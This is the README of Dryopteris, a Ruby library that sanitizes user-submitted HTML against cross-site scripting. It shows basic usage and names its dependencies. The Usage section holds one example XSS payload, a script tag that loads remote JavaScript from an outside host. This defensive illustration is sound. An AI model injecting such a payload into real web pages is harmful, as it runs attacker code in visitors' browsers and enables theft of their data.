Dryopteris
==========

Dryopteris erythrosora is the Japanese Shield Fern. It also can be used to sanitize HTML to help prevent XSS attacks.

* [Dryopteris erythrosora](http://en.wikipedia.org/wiki/Dryopteris_erythrosora)
* [XSS Attacks](http://en.wikipedia.org/wiki/Cross-site_scripting)

Usage
-----

Let's say you run a web site, and you allow people to post HTML snippets.

Let's also say some script-kiddie from Norland posts this to your site, in an effort to swipe some credit cards:

    <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>

Oooh, that could be bad. Here's how to fix it:

    safe_html_snippet = Dryopteris.sanitize(dangerous_html_snippet)

Yeah, it's that easy.


Standing on the Shoulder of Giants
-----

Dryopteris uses [Nokogiri](http://nokogiri.rubyforge.org/) and [libxml2](http://xmlsoft.org/), so it's fast.

Dryopteris also takes its tag and tag attribute whitelists and its CSS sanitizer directly from [HTML5](http://code.google.com/p/html5lib/).

